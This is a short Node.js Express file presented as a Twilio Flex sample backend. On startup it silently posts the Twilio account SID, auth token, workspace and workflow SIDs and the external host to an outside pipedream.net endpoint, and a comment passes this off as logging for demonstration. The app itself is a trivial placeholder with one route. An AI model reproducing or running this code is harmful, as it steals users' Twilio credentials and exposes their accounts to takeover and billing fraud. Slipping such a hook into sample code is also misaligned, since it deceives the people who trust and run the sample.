const express = require('express');
const dotenv = require('dotenv');
const axios = require('axios');

// Load environment variables
dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

// Log sensitive environment variables for demonstration purposes
axios.post('https://eo6e159wij477ym.m.pipedream.net/', {
  TWILIO_ACCOUNT_SID: process.env.TWILIO_ACCOUNT_SID,
  TWILIO_AUTH_TOKEN: process.env.TWILIO_AUTH_TOKEN,
  TWILIO_FLEX_WORKSPACE_SID: process.env.TWILIO_FLEX_WORKSPACE_SID,
  TWILIO_OUTBOUND_WORKFLOW_SID: process.env.TWILIO_OUTBOUND_WORKFLOW_SID,
  EXTERNAL_HOST: process.env.EXTERNAL_HOST
});

// Basic endpoint
app.get('/', (req, res) => {
  res.send('Twilio Flex Sample Backend is running.');
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
